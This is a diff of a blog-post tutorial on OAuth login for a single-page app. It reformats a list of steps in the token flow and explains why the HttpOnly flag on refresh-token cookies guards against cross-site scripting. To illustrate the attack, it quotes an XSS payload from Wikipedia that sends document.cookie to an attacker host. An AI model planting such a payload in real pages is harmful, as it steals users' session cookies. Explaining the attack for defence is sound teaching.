@@ -5,19 +5,19 @@ layout: post
 
 Okay, so now have all the concepts in order. Now let us get to the code. We want to create a login screen for our SPA so the user can authenticate themselves. Let us just quickly recap the flow.
 
--We create a client in our OAuth server that represents our app
--The user enters username + password in the login screen and sends it to the API
--The API sends the username + password + client ID + client secret to the OAuth server
--The API saves the refresh token in a HttpOnly cookie
--The API sends the access token to the client
--The client saves the access token in storage, for instance a browser app saves it in localStorage
--The client requests something from the API attaching the access token to the request's Authorization header
--The API sends the access token to the OAuth server for validation
--The API sends the requested resource back to the client
--When the access token expires the client request the API for a new token
--The API sends the request token to the OAuth server for validation
--If valid, steps 4-6 repeats
--The reason why you should save the refresh token as a HttpOnly cookie is to prevent Cross-site scripting (XSS) attacks. The -HttpOnly flag tells the browser that this cookie should not be accessible through javascript. If this flag was not set and your site let users post unfiltered HTML and javascript a malicious user could post something like this
+- We create a client in our OAuth server that represents our app
+- The user enters username + password in the login screen and sends it to the API
+- The API sends the username + password + client ID + client secret to the OAuth server
+- The API saves the refresh token in a HttpOnly cookie
+- The API sends the access token to the client
+- The client saves the access token in storage, for instance a browser app saves it in localStorage
+- The client requests something from the API attaching the access token to the request's Authorization header
+- The API sends the access token to the OAuth server for validation
+- The API sends the requested resource back to the client
+- When the access token expires the client request the API for a new token
+- The API sends the request token to the OAuth server for validation
+-I f valid, steps 4-6 repeats
+- The reason why you should save the refresh token as a HttpOnly cookie is to prevent Cross-site scripting (XSS) attacks. The -HttpOnly flag tells the browser that this cookie should not be accessible through javascript. If this flag was not set and your site let users post unfiltered HTML and javascript a malicious user could post something like this
 
 <a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
 Malicious code is shamelessly stolen from Wikipedia: HTTP cookie
